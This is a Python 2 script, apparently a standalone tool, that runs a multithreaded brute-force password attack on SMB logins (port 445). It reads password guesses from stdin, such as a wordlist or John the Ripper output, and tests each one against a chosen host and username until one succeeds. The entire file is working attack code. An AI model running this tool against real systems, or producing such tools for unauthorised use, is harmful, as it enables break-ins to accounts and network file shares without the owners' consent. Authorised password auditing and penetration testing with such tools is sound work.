#!/usr/bin/env python2
#  pip install pysmb

#Example usages:
#  cat dict.txt|./smb_bruter_threaded.py
#  john --incremental -stdout=8|./smb_bruter_threaded.py
from smb.SMBConnection import SMBConnection
import pool_manager
import sys

try:
	input=raw_input
except Exception:
	pass

#returns (INT,STR)
#  INT is either 1 fail, 0 success, or -1 error
#  STR is error string or success string
def smb_login(server,username,password,timeout=None,workgroup='WORKGROUP'):
	try:
		conn=SMBConnection(username,password,'',server,is_direct_tcp=True)
		ans=conn.connect(server,445,timeout=timeout)
		conn.close()
	except Exception as error:
		return (-1,str(error))
	if ans:
		return (0,'Success')
	else:
		return (1,'Authentication failed.')

def worker(pool_man,hostname,username,workgroup):
	try:
		while not pool_man.is_done():
			password=pool_man.pop()
			if password!=None:
				test=smb_login(hostname,username,password,1,workgroup)
				if not pool_man.is_done():
					pool_man.show(password+'\t'+test[1])
					if test[0]!=1:
						pool_man.set_result(test)
	except:
		pass

pool_man=pool_manager.pool_manager_t()

if __name__=='__main__':
	if len(sys.argv)<3:
		print('Usage: '+sys.argv[0]+' HOSTNAME USERNAME [WORKGROUP] [THREADS]')
		exit(1)
	try:
		workgroup='WORKGROUP'
		if len(sys.argv)>3:
			workgroup=sys.argv[3]
		thread_count=8
		if len(sys.argv)>4:
			thread_count=int(sys.argv[4])
		print('Starting smb brute force ('+str(thread_count)+' threads)')
		for ii in range(thread_count):
			pool_man.new(worker,(sys.argv[1],sys.argv[2],workgroup))
		try:
			while not pool_man.is_done():
				pool_man.add(input(''))
		except EOFError:
			pass
		result=pool_man.wait()
		if result[0]<0:
			raise Exception(result[1])
		exit(result[0])
	except KeyboardInterrupt:
		print('Killing threads...')
		pool_man.set_result((1,'Killed.'))
		pool_man.wait()
		exit(1)
	except Exception as error:
		print(str(error))
		exit(1)
